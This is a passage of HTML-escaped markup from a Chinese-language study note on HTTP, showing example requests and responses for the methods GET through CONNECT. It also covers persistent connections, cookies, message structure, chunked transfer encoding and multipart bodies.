&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;www.hackr.jp&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;响应：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;返回  index.html 的页面资源&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;



&lt;h4 id=&#34;POST&#34;&gt;&lt;a href=&#34;#POST&#34; class=&#34;headerlink&#34; title=&#34;POST&#34;&gt;&lt;/a&gt;POST&lt;/h4&gt;&lt;p&gt;POST：传输实体主体&lt;br&gt;POST 方法用来传输实体的主体。&lt;br&gt;虽然用 GET 方法也可以传输实体的主体，但一般不用 GET 方法进行 传输，而是用 POST 方法。虽说 POST 的功能与 GET 很相似，但 POST 的主要目的并不是获取响应的主体内容。&lt;/p&gt;
&lt;p&gt;请求：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token request-line&#34;&gt;&lt;span class=&#34;token method property&#34;&gt;POST&lt;/span&gt; &lt;span class=&#34;token request-target url&#34;&gt;/submit.cgi&lt;/span&gt; &lt;span class=&#34;token http-version property&#34;&gt;HTTP/1.1&lt;/span&gt;&lt;/span&gt; 
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;www.hackr.jp &lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Length&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;1560（1560字节的数据）&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;响应：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;返回  submit.cgi 接收数据的处理结果 &lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;



&lt;h4 id=&#34;PUT&#34;&gt;&lt;a href=&#34;#PUT&#34; class=&#34;headerlink&#34; title=&#34;PUT&#34;&gt;&lt;/a&gt;PUT&lt;/h4&gt;&lt;p&gt;PUT：传输文件&lt;br&gt;PUT 方法用来传输文件。就像 FTP 协议的文件上传一样，要求在请 求报文的主体中包含文件内容，然后保存到请求 URI 指定的位置。 &lt;/p&gt;
&lt;p&gt;请求：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token request-line&#34;&gt;&lt;span class=&#34;token method property&#34;&gt;PUT&lt;/span&gt; &lt;span class=&#34;token request-target url&#34;&gt;/example.html&lt;/span&gt; &lt;span class=&#34;token http-version property&#34;&gt;HTTP/1.1&lt;/span&gt;&lt;/span&gt; 
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;www.hackr.jp &lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Type&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;text/html &lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Length&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;1560（1560 字节的数据&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;响应：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;响应返回状态码  204 No Content（比如  ：该  html 已存在于服务器上） &lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;



&lt;h4 id=&#34;HEAD&#34;&gt;&lt;a href=&#34;#HEAD&#34; class=&#34;headerlink&#34; title=&#34;HEAD&#34;&gt;&lt;/a&gt;HEAD&lt;/h4&gt;&lt;p&gt;HEAD：获得报文首部&lt;br&gt;HEAD 方法和  GET 方法一样，只是不返回报文主体部分。用于确认 URI 的有效性及资源更新的日期时间等。&lt;/p&gt;
&lt;p&gt;请求：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token request-line&#34;&gt;&lt;span class=&#34;token method property&#34;&gt;HEAD&lt;/span&gt; &lt;span class=&#34;token request-target url&#34;&gt;/index.html&lt;/span&gt; &lt;span class=&#34;token http-version property&#34;&gt;HTTP/1.1&lt;/span&gt;&lt;/span&gt; 

&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;www.hackr.jp &lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;响应：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;返回index.html有关的响应首部 &lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;



&lt;h4 id=&#34;DELETE&#34;&gt;&lt;a href=&#34;#DELETE&#34; class=&#34;headerlink&#34; title=&#34;DELETE&#34;&gt;&lt;/a&gt;DELETE&lt;/h4&gt;&lt;p&gt;DELETE：删除文件&lt;br&gt;DELETE 方法用来删除文件，是与 PUT 相反的方法。DELETE 方法按 请求 URI 删除指定的资源。&lt;/p&gt;
&lt;p&gt;请求：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token request-line&#34;&gt;&lt;span class=&#34;token method property&#34;&gt;DELETE&lt;/span&gt; &lt;span class=&#34;token request-target url&#34;&gt;/example.html&lt;/span&gt; &lt;span class=&#34;token http-version property&#34;&gt;HTTP/1.1&lt;/span&gt;&lt;/span&gt; 

&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;www.hackr.jp &lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;响应：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;响应返回状态码  204 No Content（比如  ：该  html 已从该服务器上删除） &lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;



&lt;h4 id=&#34;OPTIONS&#34;&gt;&lt;a href=&#34;#OPTIONS&#34; class=&#34;headerlink&#34; title=&#34;OPTIONS&#34;&gt;&lt;/a&gt;OPTIONS&lt;/h4&gt;&lt;p&gt;OPTIONS：询问支持的方法&lt;br&gt;OPTIONS 方法用来查询针对请求 URI 指定的资源支持的方法。 &lt;/p&gt;
&lt;p&gt;请求：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;OPTIONS * HTTP/1.1 

&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;www.hackr.jp &lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;响应：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token response-status&#34;&gt;&lt;span class=&#34;token http-version property&#34;&gt;HTTP/1.1&lt;/span&gt; &lt;span class=&#34;token status-code number&#34;&gt;200&lt;/span&gt; &lt;span class=&#34;token reason-phrase string&#34;&gt;OK &lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Allow&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;GET, POST, HEAD, OPTIONS （返回服务器支持的方法） &lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;





&lt;h4 id=&#34;TRACK&#34;&gt;&lt;a href=&#34;#TRACK&#34; class=&#34;headerlink&#34; title=&#34;TRACK&#34;&gt;&lt;/a&gt;TRACK&lt;/h4&gt;&lt;p&gt;TRACE：追踪路径&lt;br&gt;TRACE 方法是让  Web 服务器端将之前的请求通信环回给客户端的方 法。&lt;br&gt;发送请求时，在 Max-Forwards 首部字段中填入数值，每经过一个服 务器端就将该数字减 1，当数值刚好减到 0 时，就停止继续传输，最 后接收到请求的服务器端则返回状态码 200 OK 的响应&lt;/p&gt;
&lt;p&gt;请求：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token request-line&#34;&gt;&lt;span class=&#34;token method property&#34;&gt;TRACE&lt;/span&gt; &lt;span class=&#34;token request-target url&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;token http-version property&#34;&gt;HTTP/1.1&lt;/span&gt;&lt;/span&gt; 

&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;hackr.jp &lt;/span&gt;&lt;/span&gt;

&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Max-Forwards&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;2 &lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;响应：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token response-status&#34;&gt;&lt;span class=&#34;token http-version property&#34;&gt;HTTP/1.1&lt;/span&gt; &lt;span class=&#34;token status-code number&#34;&gt;200&lt;/span&gt; &lt;span class=&#34;token reason-phrase string&#34;&gt;OK &lt;/span&gt;&lt;/span&gt;

&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Type&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;message/http &lt;/span&gt;&lt;/span&gt;

&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Length&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;1024 &lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token request-line&#34;&gt;&lt;span class=&#34;token method property&#34;&gt;TRACE&lt;/span&gt; &lt;span class=&#34;token request-target url&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;token http-version property&#34;&gt;HTTP/1.1&lt;/span&gt;&lt;/span&gt; 
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;hackr.jp &lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Max-Forwards&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;2（返回响应包含请求内容） &lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;



&lt;h4 id=&#34;CONNECT&#34;&gt;&lt;a href=&#34;#CONNECT&#34; class=&#34;headerlink&#34; title=&#34;CONNECT&#34;&gt;&lt;/a&gt;CONNECT&lt;/h4&gt;&lt;p&gt;CONNECT：要求用隧道协议连接代理&lt;br&gt;CONNECT 方法要求在与代理服务器通信时建立隧道，实现用隧道协 议进行 TCP 通信。主要使用 SSL（Secure Sockets Layer，安全套接 层）和 TLS（Transport Layer Security，传输层安全）协议把通信内容 加 密后经网络隧道传输。&lt;br&gt;CONNECT 方法的格式如下所示。 &lt;/p&gt;
&lt;p&gt;CONNECT 代理服务器名:端口号    HTTP版本 &lt;/p&gt;
&lt;p&gt;请求：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;CONNECT proxy.hackr.jp:8080 HTTP/1.1 

&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;proxy.hackr.jp &lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;响应：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token response-status&#34;&gt;&lt;span class=&#34;token http-version property&#34;&gt;HTTP/1.1&lt;/span&gt; &lt;span class=&#34;token status-code number&#34;&gt;200&lt;/span&gt; &lt;span class=&#34;token reason-phrase string&#34;&gt;OK（之后进入网络隧道） &lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/bc16fc0bdc1aef2e1d96c95a7305119b.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;持久连接&#34;&gt;&lt;a href=&#34;#持久连接&#34; class=&#34;headerlink&#34; title=&#34;持久连接&#34;&gt;&lt;/a&gt;持久连接&lt;/h3&gt;&lt;p&gt;持久连接旨在建立 1 次 TCP 连接后进行多次请求和响应的交互&lt;/p&gt;
&lt;h4 id=&#34;管线化&#34;&gt;&lt;a href=&#34;#管线化&#34; class=&#34;headerlink&#34; title=&#34;管线化&#34;&gt;&lt;/a&gt;管线化&lt;/h4&gt;&lt;p&gt;不等待响应，直接发送下一个请求&lt;/p&gt;
&lt;h3 id=&#34;cookie&#34;&gt;&lt;a href=&#34;#cookie&#34; class=&#34;headerlink&#34; title=&#34;cookie&#34;&gt;&lt;/a&gt;cookie&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/be4b0058f89df48262095fa3817ef763.png&#34;&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/bafece7685c6f5723d0be0b8d9900781.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;请求：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token request-line&#34;&gt;&lt;span class=&#34;token method property&#34;&gt;GET&lt;/span&gt; &lt;span class=&#34;token request-target url&#34;&gt;/image/&lt;/span&gt; &lt;span class=&#34;token http-version property&#34;&gt;HTTP/1.1&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;hackr.jp&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Cookie&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;sid=1342077140226724&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;响应：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token response-status&#34;&gt;&lt;span class=&#34;token http-version property&#34;&gt;HTTP/1.1&lt;/span&gt; &lt;span class=&#34;token status-code number&#34;&gt;200&lt;/span&gt; &lt;span class=&#34;token reason-phrase string&#34;&gt;OK&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Date&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;Thu, 12 Jul 2012 07:12:20 GMT&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Server&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;Apache&lt;/span&gt;&lt;/span&gt;
＜Set-Cookie: sid=1342077140226724; path=/; expires=Wed,
10-Oct-12 07:12:20 GMT＞
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Type&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;text/plain; charset=UTF-8&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;





&lt;hr&gt;
&lt;h2 id=&#34;HTTP报文&#34;&gt;&lt;a href=&#34;#HTTP报文&#34; class=&#34;headerlink&#34; title=&#34;HTTP报文&#34;&gt;&lt;/a&gt;HTTP报文&lt;/h2&gt;&lt;h3 id=&#34;结构&#34;&gt;&lt;a href=&#34;#结构&#34; class=&#34;headerlink&#34; title=&#34;结构&#34;&gt;&lt;/a&gt;结构&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/3cc4a6cf42aa0161d3b83ff598b01724.png&#34;&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/3ad6ac069f66bb198aba64a2803ea8ad.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/42f1143b5ce8261c3255e62dd8e28d32.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;压缩传输&#34;&gt;&lt;a href=&#34;#压缩传输&#34; class=&#34;headerlink&#34; title=&#34;压缩传输&#34;&gt;&lt;/a&gt;压缩传输&lt;/h3&gt;&lt;p&gt;常用的内容编码有以下几种：&lt;br&gt;gzip（GNU zip）&lt;br&gt;compress（UNIX 系统的标准压缩）&lt;br&gt;deflate（zlib）&lt;br&gt;identity（不进行编码）&lt;/p&gt;
&lt;h3 id=&#34;分割发送的分块传输编码&#34;&gt;&lt;a href=&#34;#分割发送的分块传输编码&#34; class=&#34;headerlink&#34; title=&#34;分割发送的分块传输编码&#34;&gt;&lt;/a&gt;分割发送的分块传输编码&lt;/h3&gt;&lt;p&gt;分块传输编码会将实体主体分成多个部分（块）。每一块都会用十六 进制来标记块的大小，而实体主体的最后一块会使用“0(CR+LF)”来标记。&lt;br&gt;使用分块传输编码的实体主体会由接收的客户端负责解码，恢复到编 码前的实体主体。&lt;/p&gt;
&lt;h3 id=&#34;发送多种数据的多部分对象集合&#34;&gt;&lt;a href=&#34;#发送多种数据的多部分对象集合&#34; class=&#34;headerlink&#34; title=&#34;发送多种数据的多部分对象集合&#34;&gt;&lt;/a&gt;发送多种数据的多部分对象集合&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;multipart/form-data（文件上传时）&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Type&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;multipart/form-data; boundary=AaB03x&lt;/span&gt;&lt;/span&gt;
--AaB03x
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Disposition&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;form-data; name=&#34;field1&#34;&lt;/span&gt;&lt;/span&gt;
Joe Blow
--AaB03x
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Disposition&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;form-data; name=&#34;pics&#34;; filename=&#34;file1.txt&#34;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Type&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;text/plain&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token text-plain&#34;&gt;...（file1.txt的数据）...
--AaB03x--&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;multipart/byteranges&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token response-status&#34;&gt;&lt;span class=&#34;token http-version property&#34;&gt;HTTP/1.1&lt;/span&gt; &lt;span class=&#34;token status-code number&#34;&gt;206&lt;/span&gt; &lt;span class=&#34;token reason-phrase string&#34;&gt;Partial Content&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Date&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;Fri, 13 Jul 2012 02:45:26 GMT&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Last-Modified&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;Fri, 31 Aug 2007 02:02:20 GMT&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Type&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;multipart/byteranges; boundary=THIS_STRING_SEPARATES&lt;/span&gt;&lt;/span&gt;

--THIS_STRING_SEPARATES
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Type&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;application/pdf&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;bytes 500-999/8000&lt;/span&gt;&lt;/span&gt;
...（范围指定的数据）...

--THIS_STRING_SEPARATES
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Type&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;application/pdf&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;bytes 7000-7999/8000&lt;/span&gt;&lt;/span&gt;
...（范围指定的数据）...
